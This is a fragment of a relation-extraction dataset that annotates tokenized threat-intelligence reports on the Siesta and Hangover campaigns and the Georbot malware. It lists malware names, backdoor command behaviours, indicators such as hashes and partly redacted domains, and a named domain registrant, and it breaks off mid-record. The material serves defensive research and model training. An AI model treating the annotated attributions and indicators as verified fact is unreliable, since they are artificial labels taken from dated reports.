"December", "CrowdCast:", "Rockin\u2019", "Around"], ["Your", "Unsecured", "Network"], ["Cloud-Based", "Security:", "The", "Next"], ["Generation", "of", "Defense", "for", "the", "Good", "Guys"], ["\u2192"], ["Follow", "Us"], ["Tweets", "about", "\"from:crowdstrike", "OR", "from:Adam_Cyber", "OR", "from:JMDeC", "OR", "from:DmitriCyber", "OR"], ["from:StevenChabinsky", "OR", "from:George_Kurtz\""], ["Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015"], ["Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity"], ["November", "2", ",", "2015"], ["Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware"], ["October", "16", ",", "2015"], ["Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015"], ["U", ".", "S.", "\u2013", "China", "Agreement", "on", "Cyber", "Intrusions:", "An", "In\ufb02ection", "Point"], ["September", "25", ",", "2015"], ["Archives"], ["N"], ["M"], ["T"], ["W"], ["O"], ["V"], ["T"], ["E"], ["M"], ["B"], ["E"], ["F"], ["R"], ["2"], ["S"], ["0"], ["1"], ["5"], ["S"], ["1"], ["2"], ["3"], ["4"], ["5"], ["6"], ["7"], ["8"], ["9"], ["10"], ["11"], ["12"], ["13"], ["14"], ["15"], ["16"], ["17"], ["18"], ["19"], ["20"], ["21"], ["22"], ["23"], ["24"], ["25"], ["26"], ["27"], ["28"], ["29"], ["30"], ["\u00ab", "Oct"], ["Recent", "Comments"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "Safe", "sent_id": 2, "pos": [10]}, {"old_id": "T2", "type": "Campaign", "name": "Siesta", "sent_id": 0, "pos": [1]}, {"old_id": "T3", "type": "Campaign", "name": "Siesta", "sent_id": 4, "pos": [1]}, {"old_id": "T4", "type": "Campaign", "name": "Siesta", "sent_id": 17, "pos": [1]}, {"old_id": "T5", "type": "ExploitTargetObject0", "name": "undisclosed company", "sent_id": 19, "pos": [5, 6]}, {"old_id": "T7", "type": "Exploit", "name": "spear-phishing emails", "sent_id": 18, "pos": [11, 12]}, {"old_id": "T8", "type": "File", "name": "http://{malicious domain}/{organization name}/{legitimate archive name}zip", "sent_id": 24, "pos": []}, {"old_id": "T9", "type": "Dropper", "name": "TROJ_SLOTH", "sent_id": 25, "pos": []}, {"old_id": "T10", "type": "Payload", "name": "google{BLOCKED}exe", "sent_id": 29, "pos": []}, {"old_id": "T11", "type": "Indicator", "name": "http://wwwmicro{BLOCKED} com/indexhtml", "sent_id": 31, "pos": []}, {"old_id": "T12", "type": "Malware", "name": "BKDR_SLOTHB", "sent_id": 32, "pos": []}, {"old_id": "T13", "type": "SHA-1", "name": "014542eafb792b98196954373b3fd13e60cb94fe", "sent_id": 47, "pos": []}, {"old_id": "T14", "type": "Dropper", "name": "Questionaire Concerning the Spread of Superbugs February 2014exe", "sent_id": 46, "pos": []}, {"old_id": "T15", "type": "Payload", "name": "UIODsevrexe", "sent_id": 48, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "BKDR_SLOTHB", "sent_id": 48, "pos": []}, {"old_id": "T17", "type": "Indicator", "name": "skys{BLOCKED}com", "sent_id": 49, "pos": [5]}, {"old_id": "T18", "type": "Malware", "name": "BKDR_SLOTHA", "sent_id": 50, "pos": []}, {"old_id": "T19", "type": "Campaign", "name": "Siesta", "sent_id": 52, "pos": []}, {"old_id": "T20", "type": "Indicator", "name": "sky{BLOCKED}com", "sent_id": 74, "pos": []}, {"old_id": "T21", "type": "Indicator", "name": "micro{BLOCKED}com", "sent_id": 75, "pos": []}, {"old_id": "T22", "type": "Indicator", "name": "ifued{BLOCKED}net", "sent_id": 75, "pos": []}, {"old_id": "T23", "type": "Attacker", "name": "Li Ning", "sent_id": 75, "pos": [12, 13]}, {"old_id": "T24", "type": "Email", "name": "xiaomao{BLOCKED}@163com", "sent_id": 76, "pos": []}], "labels": [{"old_id": "R1", "r": "P27", "h": 3, "t": 4, "evidence": [17, 18, 19]}, {"old_id": "R2", "r": "P22", "h": 3, "t": 5, "evidence": [17, 18]}, {"old_id": "R3", "r": "P21", "h": 6, "t": 7, "evidence": [24, 25]}, {"old_id": "R4", "r": "P13", "h": 7, "t": 8, "evidence": [25, 26, 27, 28, 29]}, {"old_id": "R5", "r": "P21", "h": 9, "t": 7, "evidence": []}, {"old_id": "R6", "r": "P22", "h": 3, "t": 7, "evidence": [17, 18, 19, 20, 21, 22, 23, 24, 25]}, {"old_id": "R7", "r": "P21", "h": 9, "t": 10, "evidence": [31, 32]}, {"old_id": "R8", "r": "P23", "h": 3, "t": 10, "evidence": [17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32]}, {"old_id": "R9", "r": "P21", "h": 11, "t": 12, "evidence": []}, {"old_id": "R10", "r": "P13", "h": 12, "t": 13, "evidence": [46, 47, 48]}, {"old_id": "R11", "r": "P21", "h": 15, "t": 12, "evidence": []}, {"old_id": "R12", "r": "P13", "h": 16, "t": 13, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 11, "t": 16, "evidence": [47, 48, 49, 50]}, {"old_id": "R14", "r": "P21", "h": 15, "t": 16, "evidence": [49, 50]}, {"old_id": "R15", "r": "P22", "h": 17, "t": 16, "evidence": []}, {"old_id": "R16", "r": "P22", "h": 17, "t": 14, "evidence": []}, {"old_id": "R17", "r": "P2", "h": 21, "t": 10, "evidence": []}], "title": ["inputs/txt/201403TrendMicroSiesta"], "sents": [["The", "Siesta", "Campaign:", "A", "New", "Cybercrime", "Operation", "Awakens"], ["In", "the", "past", "few", "weeks", ",", "we", "have", "received", "several", "reports", "of", "targeted", "attacks", "that", "exploited", "various"], ["application", "vulnerabilities", "to", "infiltrate", "various", "organizations", ".", "Similar", "to", "the", "Safe", "Campaign", ",", "the", "campaigns"], ["we", "noted", "went", "seemingly", "unnoticed", "and", "under", "the", "radar", ".", "The", "attackers", "orchestrating", "the", "campaign", "we", "call"], ["the", "Siesta", "Campaign", "used", "multicomponent", "malware", "to", "target", "certain", "institutions", "that", "fall", "under", "the"], ["following", "industries:"], ["Consumer", "goods", "and", "services"], ["Energy"], ["Finance"], ["Healthcare"], ["Media", "and", "telecommunications"], ["Public", "administration"], ["Security", "and", "defense"], ["Transport", "and", "traffic"], ["Threat", "actors", "don\u2019t", "always", "rely", "on", "complex", "attack", "vectors", "to", "infiltrate", "an", "organization\u2019s", "network", ".", "Attackers"], ["can", "also", "make", "use", "of", "basic", "social", "engineering", "techniques", "for", "their", "victims", "to", "take", "the", "bait", ",", "such", "as", "in", "our"], ["case", "study", "below", "."], ["The", "Siesta", "Campaign:", "A", "Case", "Study"], ["We", "are", "currently", "investigating", "an", "incident", "that", "involved", "attackers", "sending", "out", "spear-phishing", "emails"], ["addressed", "to", "executives", "of", "an", "undisclosed", "company", ".", "These", "emails", "were", "sent", "from", "spoofed", "email", "addresses"], ["of", "personnel", "within", "the", "organization", ".", "Instead", "of", "using", "attachments", "and", "document", "exploits", ",", "this", "specific"], ["campaign", "served", "their", "malware", "through", "a", "legitimate-looking", "file", "download", "link", "."], ["To", "lure", "the", "target", "into", "downloading", "the", "file", ",", "the", "attacker", "serves", "the", "archive", "under", "a", "URL", "path", "named", "after"], ["the", "target", "organization\u2019s", "name", "as", "cited", "below:"], ["http://{malicious", "domain}/{organization", "name}/{legitimate", "archive", "name}", ".", "zip"], ["This", "archive", "contains", "an", "executable", "(TROJ_SLOTH)", "disguised", "as", "a", "PDF", "document", ".", "When", "executed", ",", "it"], ["drops", "and", "opens", "a", "valid", "PDF", "file", ",", "which", "was", "most", "probably", "taken", "from", "the", "target", "organization\u2019s", "website", "."], ["Along", "with", "this", "valid", "PDF", "file", ",", "another", "malicious", "component", "is", "also", "dropped", "and", "executed", "in", "the"], ["background", "."], ["This", "backdoor", "component", "is", "named", "google{BLOCKED}", ".", "exe.", "(Due", "to", "the", "ongoing", "investigation", ",", "we", "are"], ["unfortunately", "unable", "to", "share", "hashes", "and", "filenames", "at", "this", "time", ".", ")", "This", "backdoor", "connects", "to"], ["http://www", ".", "micro{BLOCKED}.", "com/index", ".", "html,", "which", "are", "its", "command-and-control", "(C&C)", "servers", "."], ["Trend", "Micro", "identifies", "these", "samples", "as", "BKDR_SLOTH", ".", "B."], ["At", "this", "point", ",", "the", "malware", "begins", "waiting", "for", "additional", "commands", "from", "the", "attacker", ".", "The", "encrypted"], ["commands", "that", "are", "accepted", "are:"], ["Sleep:"], ["Commands", "the", "backdoor", "to", "sleep", "for", "specified", "number", "of", "minutes"], ["We", "have", "received", "a", "sleep", "command", "of", "\u201csleep:120\u201d", "during", "our", "analysis", "which", "means", "that", "the"], ["malware", "will", "wait", "for", "2hrs", "before", "establishing", "a", "connection", "again", "to", "the", "C&C", "server"], ["Download:", "<download_url>"], ["Commands", "the", "backdoor", "to", "download", "and", "execute", "a", "file", "(most", "probably", "another", "Win32"], ["executable)", "from", "a", "specified", "URL"], ["The", "C&C", "servers", "used", "in", "this", "campaign", "are", "found", "to", "be", "newly", "registered", "and", "also", "short-lived", ",", "making", "it"], ["difficult", "for", "us", "to", "track", "the", "malware\u2019s", "behavior", "."], ["Based", "on", "our", "research", ",", "we", "found", "2", "variants", "of", "the", "malware", "used", "in", "this", "campaign", ".", "Although", "not", "exactly"], ["alike", ",", "the", "behaviors", "are", "nearly", "identical", "."], ["One", "of", "the", "similar", "samples", "is", "a", "file", "named", "Questionaire", "Concerning", "the", "Spread", "of", "Superbugs", "February"], ["2014", ".", "exe", "(SHA1:", "014542eafb792b98196954373b3fd13e60cb94fe)", ".", "This", "sample", "drops", "the", "file"], ["UIODsevr", ".", "exe,", "its", "backdoor", "component", "which", "behaves", "similarly", "as", "BKDR_SLOTH", ".", "B", "with", "the", "addition", "of"], ["communicating", "to", "its", "C&C", "at", "skys{BLOCKED}com", ".", "These", "samples", "are", "identified", "by", "Trend", "Micro", "as"], ["BKDR_SLOTH", ".", "A."], ["Both", "variants", "excessively", "use", "Sleep", "calls", ",", "which", "renders", "the", "malware", "dormant", "for", "varying", "periods", "of", "time", ","], ["hence", "the", "campaign", "name", "\u201cSiesta\u201d", "(which", "means", "to", "take", "a", "short", "nap", "in", "Spanish)", ".", "Commands", "are", "being"], ["served", "through", "HTML", "pages", "using", "different", "keywords", "as", "listed", "below:"], ["Variant", "1"], ["prefix:", "\u201c>SC<\u201d"], ["Variant", "2"], ["prefix:", "\u201clongDesc=\u201d"], ["suffix:", "\u201c", ".", "txt\u201d"], ["Listed", "below", "are", "the", "backdoor", "commands", "we", "were", "able", "to", "see", "from", "our", "analysis:"], ["Variant", "1"], ["\u201crun1\u201d", "\u2013", "open", "a", "remote", "shell"], ["\u201crun2\u201d", "\u2013", "pipe", "shell", "commands", "from", "URL1"], ["\u201crun3\u201d", "\u2013", "pipe", "shell", "commands", "from", "URL2"], ["\u201chttp\u201d", "\u2013", "pipe", "shell", "commands", "from", "C2"], ["\u201cx_\u201d", "\u2013", "sleep", "for", "specified", "number", "of", "minutes"], ["Variant", "2"], ["\u201csleep:\u201d", "\u2013", "sleep", "for", "specified", "number", "of", "minutes"], ["\u201cdownload:\u201d", "\u2013", "download", "and", "execute", "another", "executable", "from", "C2"], ["Attribution"], ["Attribution", "of", "campaigns", "and", "attack", "methods", "can", "often", "be", "difficult", ".", "We", "were", "able", "to", "identify", "this", "new"], ["campaign", "through", "inspecting", "hashes", ",", "C&Cs", ",", "registrants", ",", "commands", ",", "and", "additional", "information", "."], ["Figure", "1", ".", "Attribution", "Graph", "(click", "the", "thumbnail", "for", "full", "view)"], ["During", "the", "course", "of", "our", "investigation", "into", "this", "new", "campaign", ",", "we", "investigated", "the", "malware", "dropped", ".", "We"], ["quickly", "noticed", "the", "registrant", "of", "sky{BLOCKED}", ".", "com", "is", "also", "the", "same", "registrant", "as"], ["micro{BLOCKED}", ".", "com", "and", "ifued{BLOCKED}", ".", "net.", "This", "individual", "used", "the", "name", "Li", "Ning", "and", "others", "with"], ["an", "email", "address", "of", "xiaomao{BLOCKED}@163", ".", "com.", "This", "individual", "also", "recently", "registered", "79", "additional"], ["domains", ".", "There", "are", "a", "total", "of", "roughly", "17", ",", "000", "domains", "registered", "with", "this", "same", "email", "address", "."], ["Figure", "2", ".", "Domains", "registered", "under", "the", "name", "Li", "Ning", ",", "based", "on", "Whois", "data"], ["Conclusion"], ["Early", "detection", "is", "crucial", "in", "preventing", "targeted", "attacks", "from", "exfiltrating", "confidential", "company", "data", "."], ["Organizations", "and", "large", "enterprises", "need", "an", "advanced", "threat", "protection", "platform", "like", "Trend", "Micro\u2122", "Deep"], ["Discovery", ",", "which", "can", "mitigate", "the", "risks", "posed", "by", "targeted", "attacks", "through", "its", "various", "security", "technologies"], ["and", "global", "threat", "intelligence", ".", "At", "the", "heart", "of", "our", "Custom", "Defense", "solution", "is", "Deep", "Discovery", "which"], ["provides", "real-time", "local", "and", "global", "intelligence", "across", "the", "attack", "life", "cycle", ".", "This", "can", "help", "IT", "administrators"], ["understand", "the", "nature", "of", "the", "attack", "they", "are", "dealing", "with", "."], ["Trend", "Micro", "blocks", "all", "related", "threats", ",", "emails", "and", "URLs", "associated", "with", "these", "attacks", ".", "As", "always", ",", "we"], ["advise", "users", "to", "exercise", "caution", "when", "opening", "emails", "and", "links", "."], ["With", "additional", "insights", "and", "analysis", "from", "Kervin", "Alintanahin", ",", "Dove", "Chiu", ",", "and", "Kyle", "Wilhoit", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "HANGOVER", "sent_id": 0, "pos": [1]}, {"old_id": "T2", "type": "Country", "name": "India", "sent_id": 2, "pos": [12]}, {"old_id": "T3", "type": "ExploitTargetObject", "name": "Pakistan", "sent_id": 5, "pos": [7]}, {"old_id": "T4", "type": "ExploitTargetObject", "name": "United States", "sent_id": 5, "pos": [12, 13]}, {"old_id": "T5", "type": "Organization", "name": "Telenor", "sent_id": 6, "pos": [9]}, {"old_id": "T6", "type": "Time", "name": "March 17 2013", "sent_id": 8, "pos": [1, 4]}, {"old_id": "T7", "type": "Exploit", "name": "Spear phishing emails", "sent_id": 9, "pos": []}, {"old_id": "T8", "type": "Organization", "name": "Norman Shark", "sent_id": 11, "pos": [7, 8]}, {"old_id": "T9", "type": "Campaign", "name": "HangOver", "sent_id": 14, "pos": [0]}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "Pakistan", "sent_id": 18, "pos": [34]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "Iran", "sent_id": 18, "pos": [36]}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "United States", "sent_id": 19, "pos": [0, 1]}, {"old_id": "T13", "type": "Campaign", "name": "Hangover", "sent_id": 27, "pos": [20]}, {"old_id": "T14", "type": "Campaign", "name": "Hangover", "sent_id": 35, "pos": [1]}, {"old_id": "T15", "type": "Country", "name": "China", "sent_id": 38, "pos": [9]}, {"old_id": "T16", "type": "Campaign", "name": "Hangover", "sent_id": 38, "pos": [20]}, {"old_id": "T17", "type": "Country", "name": "India", "sent_id": 39, "pos": [5]}, {"old_id": "T18", "type": "Organization", "name": "Telenor", "sent_id": 47, "pos": [1]}, {"old_id": "T19", "type": "ExploitTargetObject", "name": "Pakistani", "sent_id": 55, "pos": [2]}, {"old_id": "T20", "type": "ExploitTargetObject", "name": "US", "sent_id": 55, "pos": []}], "labels": [{"old_id": "R1", "r": "P32", "h": 0, "t": 1, "evidence": [0, 1, 2]}, {"old_id": "R2", "r": "P27", "h": 0, "t": 2, "evidence": [0, 1, 2, 3, 4, 5]}, {"old_id": "R3", "r": "P27", "h": 0, "t": 3, "evidence": [0, 1, 2, 3, 4, 5]}, {"old_id": "R4", "r": "P22", "h": 0, "t": 6, "evidence": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]}, {"old_id": "R5", "r": "P27", "h": 8, "t": 9, "evidence": [14, 15, 16, 17, 18]}, {"old_id": "R6", "r": "P27", "h": 8, "t": 10, "evidence": [14, 15, 16, 17, 18]}, {"old_id": "R7", "r": "P27", "h": 8, "t": 11, "evidence": [14, 15, 16, 17, 18, 19]}, {"old_id": "R8", "r": "P32", "h": 13, "t": 14, "evidence": [35, 36, 37, 38]}, {"old_id": "R9", "r": "P32", "h": 15, "t": 16, "evidence": [38, 39]}, {"old_id": "R10", "r": "P27", "h": 15, "t": 18, "evidence": [38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55]}, {"old_id": "R11", "r": "P27", "h": 15, "t": 19, "evidence": [38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55]}], "title": ["inputs/txt/201305NormanHangover"], "sents": [["OPERATION", "HANGOVER", "|Executive", "Summary"], ["Unveiling", "an", "Indian", "Cyberattack", "Infrastructure"], ["This", "report", "details", "a", "sophisticated", "cyberattack", "infrastructure", "that", "appears", "to", "originate", "from", "India", ","], ["conducted", "by", "private", "threat", "actors", "with", "no", "evidence", "of", "state-sponsorship", ".", "It", "has", "likely", "been", "in"], ["operation", "for", "over", "three", "years", ",", "primarily", "as", "a", "platform", "for", "surveillance", "against", "targets", "of", "national"], ["security", "interest", "that", "are", "mostly", "based", "in", "Pakistan", "and", "possibly", "in", "the", "United", "States", ".", "It", "is", "also"], ["used", "for", "industrial", "espionage", "against", "the", "Norwegian", "telecom", "corporation", "Telenor", "and", "other", "civilian", "corporations", ".", "Evidence", "points", "to", "professional", "project", "management", "and", "outsourcing", "of", "key"], ["tasks", ",", "including", "some", "by", "freelance", "programmers", "."], ["On", "March", "17", ",", "2013", "a", "Norwegian", "newspaper", "reported", "that", "the", "country\u2019s", "telecommunications", "giant"], ["Telenor", "had", "filed", "a", "criminal", "police", "case", "for", "an", "unlawful", "computer", "intrusion", ".", "Spear", "phishing"], ["emails", "targeting", "upper", "management", "appeared", "to", "be", "the", "source", "of", "the", "infection"], ["Through", "extensive", "analysis", ",", "security", "analysts", "at", "Norman", "Shark", "in", "conjunction", "with", "our", "partners", ","], ["quickly", "uncovered", "a", "previously", "unknown", "and", "sophisticated", "infrastructure", "for", "targeted", "attacks", "."], ["Norman", "Confidential"], ["HangOver", "Report", "Executive", "Summary", "4/25/2013"], ["Cyberattack", "Objectives"], ["The", "primary", "purpose", "of", "this", "long-running", ",", "global", "command-and-control", "network", "appears", "to", "be", "surveillance", "against", "national", "security", "interests", ".", "Privatesector", "industrial", "espionage", "in", "fields", "as", "diverse", "as", "natural", "resources", ",", "telecommunications", ",", "law", ",", "food", "&", "restaurants", ",", "and", "manufacturing", "is", "likely", "a", "secondary", "purpose", "of", "this", "network", "."], ["Target", "Selection"], ["Based", "on", "analysis", "of", "IP", "addresses", "collected", "from", "criminal", "data", "stores", "discovered", "during", "the", "investigation", ",", "it", "appears", "that", "potential", "victims", "have", "been", "targeted", "in", "over", "a", "dozen", "countries", ",", "most", "heavily", "represented", "by", "Pakistan", ",", "Iran", ",", "and", "the"], ["United", "States", ".", "Targets", "include", "government", ",", "military", ",", "and", "civilian", "organizations"], ["Highly-Targeted", "Social", "Engineering", "Tactics"], ["Spear", "phishing", "to", "carefully-selected", "target", "individuals", "was", "the", "primary", "attack"], ["vector", "identified", "in", "the", "investigation", ".", "The", "attackers", "went", "to", "great", "lengths", "to"], ["make", "the", "social", "engineering", "aspects", "of", "the", "attack", "appear", "as", "credible", "and", "applicable", "as", "possible", "."], ["In", "many", "cases", ",", "decoy", "files", "and", "websites", "were", "used", ",", "specifically", "geared", "to", "the"], ["particular", "sensibilities", "of", "regional", "targets", "including", "cultural", "and", "religious", "subject", "matter", ".", "Victims", "would", "click", "on", "what", "appeared", "to", "be", "an", "interesting", "document", ",", "and", "begin", "the", "long-running", "infection", "cycle", "."], ["Exploit", "Tools", "and", "Techniques"], ["Despite", "all", "of", "the", "recent", "media", "attention", "on", "so-called", "\u201czero-day\u201d", "exploits", "encompassing", "brand", "new", ",", "never-before-seen", "attack", "methods", ",", "Operation", "Hangover"], ["appears", "to", "have", "relied", "exclusively", "upon", "well-known", ",", "previously", "identified", "vulnerabilities", "in", "Java", ",", "Word", "documents", ",", "and", "web", "browsers", "."], ["Favored", "methods", "include", "documents", "infected", "with", "malicious", "code", ",", "along", "with"], ["direction", "to", "malicious", "websites", "with", "names", "deliberately", "similar", "to", "legitimate"], ["government", ",", "entertainment", ",", "security", "related", ",", "and", "commercial", "sites", ".", "Often", "the"], ["user", "would", "be", "presented", "with", "a", "legitimate", "document", "or", "software", "download", "they"], ["were", "expecting", "to", "see", ",", "along", "with", "an", "unseen", "malicious", "download", "."], ["Infrastructure", "Development"], ["Operation", "Hangover", "utilizes", "a", "very", "extensive", "and", "sophisticated", "command-andcontrol", "infrastructure", ",", "likely", "developed", "over", "many", "months", "or", "years", "by", "numerous", "developers", ".", "Our", "investigation", "revealed", "evidence", "of", "professional", "project"], ["management", "practices", "used", "to", "design", "frameworks", ",", "modules", ",", "and", "subcomponents", ".", "Individual", "malware", "authors", "were", "assigned", "certain", "tasks", ",", "and", "components", "were", "\u201coutsourced\u201d", "to", "what", "appear", "to", "be", "freelance", "programmers", "."], ["Attribution", "of", "Responsibility"], ["In", "recent", "months", ",", "much", "focus", "has", "been", "on", "China", "\u2013", "including", "both", "statesponsored", "and", "individual", "actors", "\u2013", "but", "Operation", "Hangover", "contains", "notable"], ["hallmarks", "of", "originating", "exclusively", "in", "India", ".", "We", "base", "this", "attribution", "with", "a"], ["very", "high", "degree", "of", "confidence", "on", "our", "extensive", "analysis", "of", "IP", "addresses", ",", "website", "domain", "registrations", ",", "and", "text-based", "identifiers", "contained", "within", "the", "malicious", "code", "itself", ".", "All", "indications", "point", "to", "private", "syndicates", "of", "threat", "actors"], ["following", "their", "own", "motivations", ",", "with", "no", "direct", "evidence", "of", "state-sponsorship"], ["by", "the", "Indian", "government", "or", "by", "any", "other", "nation", "."], ["Norman", "Confidential"], ["ATTACK", "OVERVIEW"], ["\u00b7\u00b7\u00b7"], ["Discovery", "of", "a", "security", "breach", "at"], ["Norway-based", "Telenor", "uncovered", "a"], ["long", "running", ",", "sophisticated", "global"], ["cyberattack", "infrastructure", "that", "likely"], ["continues", "to", "this", "day", "."], ["Cyberattack", "Objectives"], ["\uf0b7", "National", "security", "interests"], ["\uf0b7", "Industrial", "espionage"], ["Target", "Selection"], ["\uf0b7", "Primarily", "Pakistani", "and", "US-based"], ["targets"], ["\uf0b7", "Business", "targets"], ["Highly-Targeted", "Social", "Engineering", "Tactics"], ["\uf0b7", "Executables", "disguised", "as", "documents"], ["\uf0b7", "Malicious", "web", "downloads"], ["Exploit", "Tools", "and", "Techniques"], ["\uf0b7", "Known", "vulnerabilities", "only"], ["\uf0b7", "No", "use", "of", "zero-day", "exploits"], ["Infrastructure", "Development"], ["\uf0b7", "Evidence", "of", "professional", "project"], ["management"], ["\uf0b7", "Outsourcing", "of", "development"], ["Attribution", "of", "Responsibility"], ["\uf0b7", "Individual", "actors", "likely", "based", "in"], ["India"], ["\uf0b7", "Private", "data", "security", "firms", "hired"], ["to", "build", "specific", "infrastructure"], ["components"], ["\uf0b7", "No", "evidence", "of", "state-sponsored"], ["activity"], ["Contact", "information:"], ["Gary", "Thompson", ",", "925", ".", "768.2400"], ["Tim", "Johnson", ",", "415", ".", "385.9537"], ["norman@claritycommunications", ".", "us"], ["HangOver", "Report", "Executive", "Summary", "4/25/2013"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Georbot", "sent_id": 2, "pos": []}, {"old_id": "T2", "type": "Organization", "name": "Computer Emergency Response Team\u201d of Republic of Georgia", "sent_id": 8, "pos": []}, {"old_id": "T3", "type": "Organization", "name": "CERT-Georgia", "sent_id": 8, "pos": [4]}, {"old_id": "T4", "type": "Information", "name": "Georgian and American Security Documents", "sent_id": 12, "pos": [0, 4]}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "Georgian News-Related web-sites", "sent_id": 29, "pos": [8, 10]}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "wwwcaucasustimescom", "sent_id": 35, "pos": []}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "wwwceige", "sent_id": 36, "pos": []}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "wwwpsnewsge", "sent_id": 38, "pos": []}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "emagovge", "sent_id": 40, "pos": []}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "wwwopentextge", "sent_id": 41, "pos": []}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "wwwpresage", "sent_id": 42, "pos": []}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "wwwpresagetv", "sent_id": 43, "pos": []}, {"old_id": "T13", "type": "ExploitTargetObject", "name": "wwwpsnewsinfo", "sent_id": 44, "pos": []}, {"old_id": "T14", "type": "ExploitTargetObject", "name": "wwwresonancedailycom", "sent_id": 45, "pos": []}, {"old_id": "T15", "type": "Time", "name": "September 2010", "sent_id": 64, "pos": [0, 2]}, {"old_id": "T16", "type": "Time", "name": "March 2011", "sent_id": 66, "pos": [0, 2]}, {"old_id": "T17", "type": "Time", "name": "April  2011", "sent_id": 69, "pos": [0, 3]}, {"old_id": "T18", "type": "Time", "name": "June 2011", "sent_id": 72, "pos": [0, 2]}, {"old_id": "T19", "type": "Time", "name": "October 2011", "sent_id": 75, "pos": [0, 2]}, {"old_id": "T20", "type": "Time", "name": "November 2011", "sent_id": 78, "pos": [0, 2]}, {"old_id": "T21", "type": "Time", "name": "December 2011", "sent_id": 81, "pos": [0, 2]}, {"old_id": "T22", "type": "Time", "name": "January 2012", "sent_id": 84, "pos": [0, 2]}, {"old_id": "T23", "type": "Time", "name": "March 2012", "sent_id": 87, "pos": [0, 2]}, {"old_id": "T24", "type": "Address", "name": "178329170", "sent_id": 70, "pos": []}, {"old_id": "T26", "type": "Address", "name": "8819823855", "sent_id": 73, "pos": []}, {"old_id": "T25", "type": "Address", "name": "88198240123", "sent_id": 73, "pos": []}, {"old_id": "T27", "type": "Address", "name": "9419948104", "sent_id": 76, "pos": []}, {"old_id": "T28", "type": "Address", "name": "17321219283", "sent_id": 79, "pos": []}, {"old_id": "T29", "type": "Address", "name": "31317563", "sent_id": 82, "pos": []}, {"old_id": "T30", "type": "Address", "name": "31214140214", "sent_id": 85, "pos": []}, {"old_id": "T31", "type": "Address", "name": "784614524", "sent_id": 88, "pos": []}, {"old_id": "T32", "type": "Country", "name": "United States", "sent_id": 65, "pos": []}, {"old_id": "T33", "type": "Country", "name": "Georgia", "sent_id": 68, "pos": []}, {"old_id": "T34", "type": "Country", "name": "France", "sent_id": 71, "pos": []}, {"old_id": "T35", "type": "Country", "name": "Germany", "sent_id": 74, "pos": []}, {"old_id": "T36", "type": "Country", "name": "Hungary", "sent_id": 77, "pos": []}, {"old_id": "T37", "type": "Country", "name": "United States", "sent_id": 80, "pos": []}, {"old_id": "T38", "type": "Country", "name": "Czech Republic", "sent_id": 83, "pos": []}, {"old_id": "T39", "type": "Country", "name": "Germany", "sent_id": 86, "pos": []}, {"old_id": "T40", "type": "Country", "name": "Germany", "sent_id": 89, "pos": []}, {"old_id": "T41", "type": "Country", "name": "Canada", "sent_id": 96, "pos": [2]}, {"old_id": "T42", "type": "Country", "name": "Ukraine", "sent_id": 96, "pos": [4]}, {"old_id": "T43", "type": "Country", "name": "China", "sent_id": 96, "pos": [8]}, {"old_id": "T44", "type": "Country", "name": "Russia", "sent_id": 98, "pos": [2]}, {"old_id": "T45", "type": "Time", "name": "30 March 2011", "sent_id": 102, "pos": [0, 3]}, {"old_id": "T46", "type": "Time", "name": "14 September 2011", "sent_id": 103, "pos": [0, 2]}, {"old_id": "T47", "type": "Time", "name": "25 November 2011", "sent_id": 105, "pos": [0, 2]}, {"old_id": "T48", "type": "Time", "name": "12 December 2011", "sent_id": 107, "pos": [0, 2]}, {"old_id": "T49", "type": "MalwareCharacteristics", "name": "Video Recording", "sent_id": 107, "pos": [5, 6]}, {"old_id": "T50", "type": "Exploit", "name": "Framephp", "sent_id": 118, "pos": []}, {"old_id": "T51", "type": "Malware", "name": "calcexe", "sent_id": 119, "pos": []}, {"old_id": "T52", "type": "Malware", "name": "Calcexe", "sent_id": 120, "pos": []}, {"old_id": "T53", "type": "GeneralVirus", "name": "usbservexe", "sent_id": 121, "pos": []}, {"old_id": "T54", "type": "Malware", "name": "framephp", "sent_id": 128, "pos": []}, {"old_id": "T55", "type": "Vulnerability", "name": "CVE-2010-0842", "sent_id": 130, "pos": [2]}, {"old_id": "T56", "type": "Vulnerability", "name": "CVE-2006-3730", "sent_id": 130, "pos": [4]}, {"old_id": "T57", "type": "Vulnerability", "name": "MS06-057", "sent_id": 130, "pos": [6]}, {"old_id": "T58", "type": "Malware", "name": "framephp", "sent_id": 131, "pos": []}, {"old_id": "T59", "type": "Exploit", "name": "0day", "sent_id": 133, "pos": [5]}, {"old_id": "T60", "type": "MalwareCharacteristics", "name": "Recording Videos from Webcam", "sent_id": 167, "pos": [1, 4]}, {"old_id": "T61", "type": "MalwareCharacteristics", "name": "Searching Sensitive word\u2019s In filenames", "sent_id": 165, "pos": [1, 5]}, {"old_id": "T62", "type": "MalwareCharacteristics", "name": "Modify malware code file from C&C Web Panel", "sent_id": 169, "pos": [1, 8]}, {"old_id": "T63", "type": "MalwareCharacteristics", "name": "Self-Created Packer Crypter in Assembler Language", "sent_id": 170, "pos": [1, 7]}, {"old_id": "T64", "type": "MalwareCharacteristics", "name": "Update mechanism", "sent_id": 171, "pos": [1, 2]}, {"old_id": "T65", "type": "MalwareCharacteristics", "name": "Base-encoded plaintext", 